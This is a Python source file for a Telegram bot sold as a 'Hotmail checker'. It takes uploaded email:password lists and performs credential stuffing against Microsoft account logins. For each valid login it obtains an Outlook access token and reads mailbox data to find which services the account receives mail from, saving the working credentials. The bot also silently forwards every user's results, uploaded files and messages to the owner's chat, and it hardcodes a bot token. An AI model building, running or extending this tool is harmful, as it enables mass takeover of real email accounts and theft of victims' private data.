import os
import uuid
import concurrent.futures
from datetime import datetime, timedelta
import requests
import asyncio
from threading import Lock
import shutil
import json
import time
from typing import Any, Callable
import functools
from collections import defaultdict, deque
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup

# -----------------------------------------------------------------------------------
#                     GLOBAL SERVICE MAPPING (200 Services)
# -----------------------------------------------------------------------------------
ALL_SERVICE_MAPPING = {
    # ... (all your mappings, omitted for brevity)
    "Roblox": "no-reply@roblox.com",
    "AMS": "armymenstrike@gmail.com",
    "Facebook": "security@facebookmail.com",
    # ... (rest omitted for brevity, keep as in your original)
    "Indiegogo": "noreply@indiegogo.com"
}

# -----------------------------------------------------------------------------------
#                     PER-USER SESSIONS AND STATS
# -----------------------------------------------------------------------------------
user_sessions_lock = Lock()
user_sessions = {}

def get_user_session(user_id: int) -> dict:
    with user_sessions_lock:
        if user_id not in user_sessions:
            user_sessions[user_id] = {
                "should_stop": False,
                "good_count": 0,
                "bad_count": 0,
                "total_checked": 0,
                "service_hits": {},
                "results_cache": {},
                "check_timestamps": deque(maxlen=600),
                "check_type": "inbox",
                "last_progress_time": time.time()
            }
        return user_sessions[user_id]

def reset_user_session(user_id: int) -> None:
    with user_sessions_lock:
        user_sessions[user_id] = {
            "should_stop": False,
            "good_count": 0,
            "bad_count": 0,
            "total_checked": 0,
            "service_hits": {},
            "results_cache": {},
            "check_timestamps": deque(maxlen=600),
            "check_type": "inbox",
            "last_progress_time": time.time()
        }

# -----------------------------------------------------------------------------------
#                     SESSION FOLDERS PER USER
# -----------------------------------------------------------------------------------
def prepare_user_session_folder(user_id: int):
    session_path = f"results/{user_id}"
    if os.path.exists(session_path):
        shutil.rmtree(session_path, ignore_errors=True)
    os.makedirs(session_path, exist_ok=True)

def save_result_for_user(user_id: int, service_name: str, email: str, password: str):
    session_path = f"results/{user_id}"
    os.makedirs(session_path, exist_ok=True)
    filename = os.path.join(session_path, f"{service_name.lower()}.txt")
    content = f"{email}:{password}\n"
    with open(filename, "a", encoding="utf-8") as f:
        f.write(content)

def save_all_hits(user_id: int, email: str, password: str):
    session_path = f"results/{user_id}"
    os.makedirs(session_path, exist_ok=True)
    filename = os.path.join(session_path, "hits.txt")
    content = f"{email}:{password}\n"
    with open(filename, "a", encoding="utf-8") as f:
        f.write(content)

def get_results_files(user_id: int):
    session_path = f"results/{user_id}"
    if not os.path.exists(session_path):
        return []
    files = [os.path.join(session_path, f) for f in os.listdir(session_path)]
    return files

def clear_user_results(user_id: int):
    session_path = f"results/{user_id}"
    shutil.rmtree(session_path, ignore_errors=True)

# -----------------------------------------------------------------------------------
#                      BOT CONSTANTS / GLOBALS
# -----------------------------------------------------------------------------------
OWNERS = {2036135496}
COOLDOWN_SECONDS = 30
user_last_used = {}
TRIAL_DB_FILE = "trial_db.json"
WHITELIST_DB_FILE = "whitelist.json"
STALL_TIMEOUT = 30
OWNER_LOG_CHAT_ID = 2036135496  # Owner's chat ID for logging messages

# -----------------------------------------------------------------------------------
#                      LOAD / SAVE TRIAL & WHITELIST
# -----------------------------------------------------------------------------------
def load_trial_db() -> dict:
    if os.path.exists(TRIAL_DB_FILE):
        try:
            with open(TRIAL_DB_FILE, "r") as f:
                return json.load(f)
        except Exception as e:
            print("Error loading trial DB:", e)
            return {}
    return {}

def save_trial_db(data: dict) -> None:
    try:
        with open(TRIAL_DB_FILE, "w") as f:
            json.dump(data, f)
    except Exception as e:
        print("Error saving trial DB:", e)

def has_trial_access(user_id: int) -> bool:
    db = load_trial_db()
    if str(user_id) not in db:
        return False
    expiration = db[str(user_id)]
    if datetime.now().timestamp() > expiration:
        db.pop(str(user_id), None)
        save_trial_db(db)
        return False
    return True

def grant_trial_access(user_id: int, hours: int = 24) -> None:
    db = load_trial_db()
    expiration = datetime.now().timestamp() + hours * 3600
    db[str(user_id)] = expiration
    save_trial_db(db)

def load_whitelist() -> dict:
    if os.path.exists(WHITELIST_DB_FILE):
        try:
            with open(WHITELIST_DB_FILE, "r") as f:
                return json.load(f)
        except Exception as e:
            print("Error loading whitelist DB:", e)
            return {}
    return {}

def save_whitelist(whitelist: dict) -> None:
    try:
        with open(WHITELIST_DB_FILE, "w") as f:
            json.dump(whitelist, f)
    except Exception as e:
        print("Error saving whitelist DB:", e)

def add_to_whitelist(user_id: int, duration: str) -> None:
    wl = load_whitelist()
    uid_str = str(user_id)
    duration = duration.lower()
    if duration == "lifetime":
        wl[uid_str] = None
    else:
        try:
            if duration.endswith("d"):
                days = int(duration[:-1])
                delta = timedelta(days=days)
            elif duration.endswith("w"):
                weeks = int(duration[:-1])
                delta = timedelta(weeks=weeks)
            elif duration.endswith("m"):
                months = int(duration[:-1])
                delta = timedelta(days=30 * months)
            elif duration.endswith("y"):
                years = int(duration[:-1])
                delta = timedelta(days=365 * years)
            else:
                return
            expiration = (datetime.now() + delta).timestamp()
            wl[uid_str] = expiration
        except ValueError:
            return
    save_whitelist(wl)

def remove_from_whitelist(user_id: int) -> None:
    wl = load_whitelist()
    wl.pop(str(user_id), None)
    save_whitelist(wl)

def is_whitelisted(user_id: int) -> bool:
    wl = load_whitelist()
    uid_str = str(user_id)
    if uid_str not in wl:
        return False
    expiration = wl[uid_str]
    if expiration is None:
        return True
    if datetime.now().timestamp() > expiration:
        remove_from_whitelist(user_id)
        return False
    return True

# -----------------------------------------------------------------------------------
#                   DECORATORS / PERMISSIONS
# -----------------------------------------------------------------------------------
def check_allowed_wrapper(func: Callable[..., Any]) -> Callable[..., Any]:
    @functools.wraps(func)
    async def wrapper(update: Update, context, *args: Any, **kwargs: Any) -> Any:
        user_id = update.effective_user.id
        if user_id in OWNERS or has_trial_access(user_id) or is_whitelisted(user_id):
            return await func(update, context, *args, **kwargs)
        await update.message.reply_text("You do not have permission to use this command. Use /trial for 24-hour access.")
        return
    return wrapper

# -----------------------------------------------------------------------------------
#                     STATS MESSAGE
# -----------------------------------------------------------------------------------
async def build_stats_message(user_id: int) -> str:
    session = get_user_session(user_id)
    total_lines = session.get("total_lines", 0)
    total_checked = session.get("total_checked", 0)
    good_count = session.get("good_count", 0)
    bad_count = session.get("bad_count", 0)
    remaining = total_lines - total_checked if total_lines > 0 else 0
    hit_rate = (good_count / total_checked * 100) if total_checked > 0 else 0
    cpm = calculate_cpm(user_id)
    time_left_seconds = (remaining / cpm * 60) if cpm > 0 else 0
    time_left_str = f"{int(time_left_seconds // 60):02d}:{int(time_left_seconds % 60):02d}"
    progress_percentage = (total_checked / total_lines * 100) if total_lines > 0 else 0
    bar_length = 10
    filled = int(bar_length * progress_percentage // 100)
    progress_bar = "█" * filled + "□" * (bar_length - filled)

    message = (
        f"📊 *Checking Stats*\n"
        f"✅ Valid: {good_count}\n"
        f"❌ Invalid: {bad_count}\n"
        f"💎 Checked: {total_checked}\n"
        f"📦 Remaining: {remaining}\n"
        f"🎯 Hit Rate: {hit_rate:.1f}%\n"
        f"⏳ Time Left: {time_left_str}\n"
        f"📈 Progress: `{progress_bar}` {progress_percentage:.1f}%\n"
    )

    # Inbox hits
    service_hits = session["service_hits"]
    if service_hits:
        total_inbox_hits = sum(len(v) for k, v in service_hits.items())
        message += f"\n*Inbox Hits:* {total_inbox_hits}"
    else:
        message += f"\n*Inbox Hits:* 0"

    return message

# -----------------------------------------------------------------------------------
#                     SEND RESULTS
# -----------------------------------------------------------------------------------
async def send_results(user_id: int, update: Update, context):
    session = get_user_session(user_id)
    check_type = session.get("check_type", "inbox")
    files = get_results_files(user_id)
    if not files:
        await context.bot.send_message(chat_id=user_id, text="No results available.")
        await context.bot.send_message(OWNER_LOG_CHAT_ID, f"No results available for user {user_id}.")
        return

    # In allhits mode, send only hits.txt (if exists). In inbox mode, send only inbox result files.
    if check_type == "allhits":
        hits_file = f"results/{user_id}/hits.txt"
        if os.path.exists(hits_file):
            try:
                await context.bot.send_document(user_id, open(hits_file, "rb"), caption="All Valid Accounts (hits.txt)")
                await context.bot.send_document(OWNER_LOG_CHAT_ID, open(hits_file, "rb"), caption=f"Results from user {user_id}")
            except Exception as e:
                await context.bot.send_message(user_id, f"Failed to send hits.txt: {e}")
                await context.bot.send_message(OWNER_LOG_CHAT_ID, f"Failed to send hits.txt to user {user_id}: {e}")
        else:
            await context.bot.send_message(chat_id=user_id, text="No valid accounts found.")
            await context.bot.send_message(OWNER_LOG_CHAT_ID, f"No valid accounts found for user {user_id}.")
    else:
        result_sent = False
        for file_path in files:
            if file_path.endswith("hits.txt"):
                continue
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                continue
            try:
                await context.bot.send_document(user_id, open(file_path, "rb"))
                await context.bot.send_document(OWNER_LOG_CHAT_ID, open(file_path, "rb"), caption=f"Results from user {user_id}")
                result_sent = True
            except Exception as e:
                await context.bot.send_message(user_id, f"Failed to send file {os.path.basename(file_path)}.")
                await context.bot.send_message(OWNER_LOG_CHAT_ID, f"Failed to send file {os.path.basename(file_path)} to user {user_id}: {e}")
        if not result_sent:
            await context.bot.send_message(chat_id=user_id, text="No inbox hits found.")
            await context.bot.send_message(OWNER_LOG_CHAT_ID, f"No inbox hits found for user {user_id}.")

# -----------------------------------------------------------------------------------
#                     CHECKER LOGIC (INBOX/ALLHITS)
# -----------------------------------------------------------------------------------
def check_all_file(file_content: str, user_id: int, batch_size: int = 50) -> None:
    session = get_user_session(user_id)
    lines = file_content.splitlines()
    valid_lines = [line.strip() for line in lines if ":" in line]
    batches = [valid_lines[i:i + batch_size] for i in range(0, len(valid_lines), batch_size)]
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        futures = []
        for batch in batches:
            if session["should_stop"]:
                break
            future = executor.submit(process_batch, batch, user_id)
            futures.append(future)
        for future in concurrent.futures.as_completed(futures, timeout=STALL_TIMEOUT * 2):
            try:
                future.result()
            except concurrent.futures.TimeoutError:
                session["should_stop"] = True
                break
            except Exception as e:
                session["should_stop"] = True
                break

def process_batch(batch: list[str], user_id: int):
    session = get_user_session(user_id)
    for line in batch:
        if session["should_stop"]:
            break
        email, password = line.split(":", 1)
        try:
            all_checker_logic(user_id, email, password)
            with user_sessions_lock:
                session["last_progress_time"] = time.time()
        except Exception:
            with user_sessions_lock:
                session["last_progress_time"] = time.time()

def all_checker_logic(user_id: int, Email: str, Password: str):
    session = get_user_session(user_id)
    if session["should_stop"]:
        return
    try:
        r = requests.get(
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
            "?client_info=1&haschrome=1"
            f"&login_hint={Email}"
            "&mkt=en"
            "&response_type=code"
            "&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
            "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D",
            headers={"User-Agent": "Mozilla/5.0"},
            timeout=5
        )
        if r.status_code != 200:
            return
        cok = r.cookies.get_dict()
        text = r.text
        if "urlPost:'" not in text:
            return
        url_post = text.split("urlPost:'")[1].split("'")[0]
        PPFT = text.split('name="PPFT" id="i0327" value="')[1].split("',")[0]
        AD = r.url.split("haschrome=1")[0]
        MSPRequ = cok.get("MSPRequ", "")
        uaid = cok.get("uaid", "")
        RefreshTokenSso = cok.get("RefreshTokenSso", "")
        MSPOK = cok.get("MSPOK", "")
        OParams = cok.get("OParams", "")
        do_login_protocol_all(user_id, Email, Password, url_post, PPFT, AD, MSPRequ, uaid, RefreshTokenSso, MSPOK, OParams)
        with user_sessions_lock:
            session["check_timestamps"].append(time.time())
    except Exception:
        pass

def do_login_protocol_all(user_id: int, Email: str, Password: str, URL: str, PPFT: str,
                          AD: str, MSPRequ: str, uaid: str, RefreshTokenSso: str, MSPOK: str, OParams: str):
    session = get_user_session(user_id)
    if session["should_stop"]:
        return
    try:
        data_str = (
            f"i13=1&login={Email}&loginfmt={Email}&type=11&LoginOptions=1"
            "&lrt=&lrtPartition=&hisRegion=&hisScaleUnit="
            f"&passwd={Password}"
            "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid="
            f"&PPFT={PPFT}"
            "&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0"
            "&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
        )
        headers = {
            "Host": "login.live.com",
            "Connection": "keep-alive",
            "Content-Length": str(len(data_str)),
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "X-Requested-With": "com.microsoft.outlooklite",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": f"{AD}haschrome=1",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
            "Cookie": (
                f"MSPRequ={MSPRequ};uaid={uaid}; RefreshTokenSso={RefreshTokenSso}; "
                f"MSPOK={MSPOK}; OParams={OParams}; MicrosoftApplicationsTelemetryDeviceId={uuid.uuid4()}"
            )
        }
        res = requests.post(URL, data=data_str, headers=headers, allow_redirects=False, timeout=5)
        cook = res.cookies.get_dict()
        hh = res.headers
        valid_login = any(k in cook for k in ["JSH", "JSHP", "ANON", "WLSSC"]) or res.text == ""
        if valid_login:
            with user_sessions_lock:
                session["good_count"] += 1
                session["total_checked"] += 1
            if session.get("check_type", "inbox") == "allhits":
                save_all_hits(user_id, Email, Password)
            do_get_token_all(user_id, Email, Password, cook, hh)
        else:
            with user_sessions_lock:
                session["bad_count"] += 1
                session["total_checked"] += 1
    except Exception:
        with user_sessions_lock:
            session["bad_count"] += 1
            session["total_checked"] += 1

def do_get_token_all(user_id: int, Email: str, Password: str, cook: dict, hh: dict):
    session = get_user_session(user_id)
    if session["should_stop"]:
        return
    try:
        if "Location" not in hh:
            return
        loc = hh["Location"]
        if "code=" not in loc:
            return
        code = loc.split("code=")[1].split("&")[0]
        CID = cook.get("MSPCID", "").upper()
        url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
        data = {
            "client_info": "1",
            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
            "grant_type": "authorization_code",
            "code": code,
            "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
        }
        resp = requests.post(url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=5)
        token = resp.json().get("access_token")
        if token:
            do_get_info_all(user_id, Email, Password, token, CID)
    except Exception:
        pass

def do_get_info_all(user_id: int, Email: str, Password: str, token: str, CID: str):
    session = get_user_session(user_id)
    if session["should_stop"]:
        return
    try:
        if session.get("check_type", "inbox") == "inbox":
            headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "ForceSync": "false",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{CID}",
                "Host": "substrate.office.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            r = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers, timeout=5).json()
            info_name = r.get("names", [])
            display_name = info_name[0]["displayName"] if info_name else "Unknown"
            url = f"https://outlook.live.com/owa/{Email}/startupdata.ashx?app=Mini&n=0"
            headers2 = {
                "Host": "outlook.live.com",
                "content-length": "0",
                "x-owa-sessionid": f"{CID}",
                "x-req-source": "Mini",
                "authorization": f"Bearer {token}",
                "user-agent": "Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36",
                "action": "StartupData",
                "x-owa-correlationid": f"{CID}",
                "ms-cv": "YizxQK73vePSyVZZXVeNr+.3",
                "content-type": "application/json; charset=utf-8",
                "accept": "*/*",
                "origin": "https://outlook.live.com",
                "x-requested-with": "com.microsoft.outlooklite",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://outlook.live.com/",
                "accept-encoding": "gzip, deflate",
                "accept-language": "en-US,en;q=0.9"
            }
            rese = requests.post(url, headers=headers2, data="", timeout=5).text
            services_list = []
            for service, marker in ALL_SERVICE_MAPPING.items():
                if marker in rese:
                    services_list.append(service)
            if services_list:
                for service_name in services_list:
                    line = f"{Email}:{Password}"
                    if line not in session["results_cache"].get(service_name.lower(), set()):
                        session["results_cache"].setdefault(service_name.lower(), set()).add(line)
                        save_result_for_user(user_id, service_name, Email, Password)
                        session["service_hits"].setdefault(service_name.lower(), []).append(display_name)
    except Exception:
        pass

def calculate_cpm(user_id: int) -> int:
    session = get_user_session(user_id)
    now = time.time()
    timestamps = session.get("check_timestamps", deque())
    return sum(1 for t in timestamps if now - t <= 60)

# -----------------------------------------------------------------------------------
#                     TELEGRAM BOT SETUP
# -----------------------------------------------------------------------------------
application = Application.builder().token("8019806160:AAEU9XmP_HRIpsHYjGDaK4WVClPk0F-G-uA").build()

async def error_handler(update: Update, context):
    print(f"Update {update} caused error {context.error}")
    await context.bot.send_message(OWNER_LOG_CHAT_ID, f"Error: {context.error}\nUpdate: {update}")

# -----------------------------------------------------------------------------------
#                     MESSAGE LOGGING
# -----------------------------------------------------------------------------------
async def log_message(update: Update, context):
    user_id = update.effective_user.id
    if update.effective_chat.type != "private":
        return
    
    user_name = f"User {user_id}"
    try:
        user = await application.bot.get_chat(user_id)
        user_name = user.first_name or user_name
    except Exception as e:
        print(f"Failed to fetch user {user_id}: {e}")

    message_text = update.message.text or update.message.caption or "No text"
    log_message = f"Message from @{user_name} ({user_id}):\n{message_text}"
    
    if update.message.document:
        try:
            file = await update.message.document.get_file()
            file_name = update.message.document.file_name
            log_message += f"\nFile: {file_name}"
            with open(file_name, "wb") as f:
                await file.download(out=f)
            with open(file_name, "rb") as f:
                await context.bot.send_document(OWNER_LOG_CHAT_ID, f, caption=log_message)
            os.remove(file_name)
        except Exception as e:
            print(f"Error handling file from {user_id}: {e}")
            await context.bot.send_message(OWNER_LOG_CHAT_ID, f"{log_message}\nError handling file: {e}")
    else:
        await context.bot.send_message(OWNER_LOG_CHAT_ID, log_message)

# -----------------------------------------------------------------------------------
#                     COMMANDS AND CALLBACKS
# -----------------------------------------------------------------------------------
@check_allowed_wrapper
async def start(update: Update, context):
    await update.message.reply_text("Welcome to Yor Hotmail Checker Bot! Use /trial for 24-hour access or /check to upload a file with email:password pairs.")

@check_allowed_wrapper
async def stop_command(update: Update, context):
    user_id = update.effective_user.id
    session = get_user_session(user_id)
    if session["should_stop"]:
        await update.message.reply_text("The process is already stopping. Please wait.")
        return
    session["should_stop"] = True
    await update.message.reply_text("Stop command received. The process will halt shortly.")

async def trial_command(update: Update, context):
    user_id = update.effective_user.id
    if update.effective_chat.type != "private":
        await update.message.reply_text("This command can only be used in private chat.")
        return
    db = load_trial_db()
    if str(user_id) in db:
        await update.message.reply_text("You have already used your trial access. You can only use trial once.")
    else:
        grant_trial_access(user_id, 24)
        await update.message.reply_text("Trial access granted for 24 hours. Enjoy your free access to the checker!")

async def whitelist_add_command(update: Update, context):
    user_id = update.effective_user.id
    if user_id not in OWNERS:
        await update.message.reply_text("Only owners can modify the whitelist.")
        return
    args = context.args
    if len(args) != 2:
        await update.message.reply_text("Usage: /whitelist_add <user_id> <duration>")
        return
    try:
        target_user_id = int(args[0])
        duration = args[1]
        add_to_whitelist(target_user_id, duration)
        await update.message.reply_text(f"User {target_user_id} added to whitelist for {duration}.")
    except ValueError:
        await update.message.reply_text("Invalid user ID or duration format.")

async def whitelist_remove_command(update: Update, context):
    user_id = update.effective_user.id
    if user_id not in OWNERS:
        await update.message.reply_text("Only owners can modify the whitelist.")
        return
    args = context.args
    if len(args) != 1:
        await update.message.reply_text("Usage: /whitelist_remove <user_id>")
        return
    try:
        target_user_id = int(args[0])
        remove_from_whitelist(target_user_id)
        await update.message.reply_text(f"User {target_user_id} removed from whitelist.")
    except ValueError:
        await update.message.reply_text("Invalid user ID.")

async def whitelist_list_command(update: Update, context):
    user_id = update.effective_user.id
    if user_id not in OWNERS:
        await update.message.reply_text("Only owners can view the whitelist.")
        return
    wl = load_whitelist()
    if not wl:
        await update.message.reply_text("The whitelist is empty.")
        return
    user_lines = []
    for uid, exp in wl.items():
        exp_str = "Lifetime" if exp is None else datetime.fromtimestamp(exp).strftime("%Y-%m-%d %H:%M:%S")
        user_lines.append(f"User {uid} — Expires: {exp_str}")
    await update.message.reply_text("Whitelisted users:\n" + "\n".join(user_lines))

async def finish_command(update: Update, context):
    user_id = update.effective_user.id
    if user_id not in OWNERS:
        await update.message.reply_text("Only owners can use this command.")
        return
    await update.message.reply_text("We're finished 🎉")

@check_allowed_wrapper
async def check_command(update: Update, context):
    user_id = update.effective_user.id
    if update.effective_chat.type != "private":
        await update.message.reply_text("This command can only be used in private chat.")
        return
    if user_id not in OWNERS:
        current_time = time.time()
        last_used = user_last_used.get(user_id, 0)
        if current_time - last_used < COOLDOWN_SECONDS:
            remaining_time = int(COOLDOWN_SECONDS - (current_time - last_used))
            await update.message.reply_text(f"⏳ You must wait {remaining_time} seconds before using this command again.")
            return
        user_last_used[user_id] = current_time

    keyboard = [
        [
            InlineKeyboardButton("📥 Inbox Mode", callback_data='check_mode_inbox'),
            InlineKeyboardButton("🔓 All Hits Mode", callback_data='check_mode_allhits'),
        ],
        [
            InlineKeyboardButton("❓ Help", callback_data='help_button')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "Choose checking mode or get help:\n\n"
        "📥 *Inbox*: Only show hits for accounts with inbox access (current behavior).\n"
        "🔓 *All Hits*: Show all valid logins regardless of inbox content.\n"
        "❓ *Help*: Show usage and commands.",
        parse_mode="Markdown",
        reply_markup=reply_markup
    )

HELP_MESSAGE = (
    "📚 Yor Hotmail Checker Bot 🚀\n"
    "Welcome! Use /trial for 24-hour access before checking. Sorry for queue delays—we’re working to make the bot faster! ⚙️\n"
    "🛠 Commands\n\n"
    "/start - Kick off with a welcome 😊\n"
    "/trial - Get 24-hour free access (private chat) 🎟️\n"
    "/check - Upload email:password file to check accounts (private chat) 📂\n"
    "/stop - Stop the checking process 🛑\n"
    "/whitelist_add   (Owner) - Add user to whitelist 🔐\n"
    "/whitelist_remove  (Owner) - Remove user from whitelist 🚫\n"
    "/whitelist_list (Owner) - View whitelisted users 📜\n"
    "/finish (Owner) - Celebrate completion 🎉\n\n"
    "❓ Need More?\n"
    "Want to buy access after /trial or get the bot’s source code? DM @gaminghub122! 💬\n"
    "Thanks for using the bot! 🔍"
)

async def check_mode_callback(update: Update, context):
    query = update.callback_query
    user_id = query.from_user.id
    session = get_user_session(user_id)
    if query.data == 'check_mode_inbox':
        session["check_type"] = "inbox"
        await query.edit_message_text("📥 Inbox Mode selected. Please send a text file with email:password pairs.")
    elif query.data == 'check_mode_allhits':
        session["check_type"] = "allhits"
        await query.edit_message_text("🔓 All Hits Mode selected. Please send a text file with email:password pairs.")
    elif query.data == 'help_button':
        await query.edit_message_text(HELP_MESSAGE)
    else:
        await query.edit_message_text("Unknown mode selected.")

async def handle_file(update: Update, context):
    user_id = update.effective_user.id
    if update.effective_chat.type != "private":
        await update.message.reply_text("This command can only be used in private chat.")
        return
    if not (user_id in OWNERS or has_trial_access(user_id) or is_whitelisted(user_id)):
        await update.message.reply_text("You do not have permission to use this command. Use /trial for 24-hour access.")
        return

    reset_user_session(user_id)
    prepare_user_session_folder(user_id)
    session = get_user_session(user_id)
    # Do NOT reset check_type here, user selection remains
    # session["check_type"] = "inbox"

    try:
        file = await update.message.document.get_file()
        file_content = (await file.download_as_bytearray()).decode("utf-8", errors="replace")
        session["total_lines"] = len(file_content.splitlines())
    except Exception as e:
        await update.message.reply_text(f"Error reading the file: {e}")
        return

    status_message = await update.message.reply_text(await build_stats_message(user_id), parse_mode="Markdown")
    loop = asyncio.get_running_loop()
    processing_done = loop.create_future()

    async def update_status_task():
        while not processing_done.done():
            try:
                session = get_user_session(user_id)
                if time.time() - session["last_progress_time"] > STALL_TIMEOUT:
                    session["should_stop"] = True
                    await context.bot.edit_message_text(
                        chat_id=update.effective_chat.id,
                        message_id=status_message.message_id,
                        text="❌ *Error: Processing Stalled*\nThe checker has stopped due to lack of progress. Please try again later.",
                        parse_mode="Markdown"
                    )
                    processing_done.set_result(True)
                    return
                await context.bot.edit_message_text(
                    chat_id=update.effective_chat.id,
                    message_id=status_message.message_id,
                    text=await build_stats_message(user_id),
                    parse_mode="Markdown"
                )
            except Exception as e:
                pass
            await asyncio.sleep(5)

    update_task = asyncio.create_task(update_status_task())

    def run_processing_sync():
        check_all_file(file_content, user_id)

    try:
        await loop.run_in_executor(None, run_processing_sync)
    except Exception as e:
        session["should_stop"] = True
        await context.bot.edit_message_text(
            chat_id=update.effective_chat.id,
            message_id=status_message.message_id,
            text="❌ *Error: Processing Failed*\nAn error occurred while processing the file. Please try again later.",
            parse_mode="Markdown"
        )
    finally:
        if not processing_done.done():
            processing_done.set_result(True)
        await update_task
        try:
            await send_results(user_id, update, context)
            await context.bot.delete_message(update.effective_chat.id, status_message.message_id)
            await context.bot.send_message(user_id, "✅ Results have been sent to your private chat!")
        except Exception:
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=status_message.message_id,
                text="❌ *Error: Failed to Send Results*\nFailed to send results to your private chat. Please ensure you have started a private chat with the bot.",
                parse_mode="Markdown"
            )
        clear_user_results(user_id)
        reset_user_session(user_id)

# -----------------------------------------------------------------------------------
#                     RUN BOT
# -----------------------------------------------------------------------------------
def main():
    application.add_error_handler(error_handler)
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("trial", trial_command))
    application.add_handler(CommandHandler("whitelist_add", whitelist_add_command))
    application.add_handler(CommandHandler("whitelist_remove", whitelist_remove_command))
    application.add_handler(CommandHandler("whitelist_list", whitelist_list_command))
    application.add_handler(CommandHandler("finish", finish_command))
    application.add_handler(CommandHandler("check", check_command))
    application.add_handler(CallbackQueryHandler(check_mode_callback, pattern="^(check_mode_|help_button)"))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    application.add_handler(MessageHandler(filters.ALL, log_message))
    application.run_polling()

if __name__ == "__main__":
    main()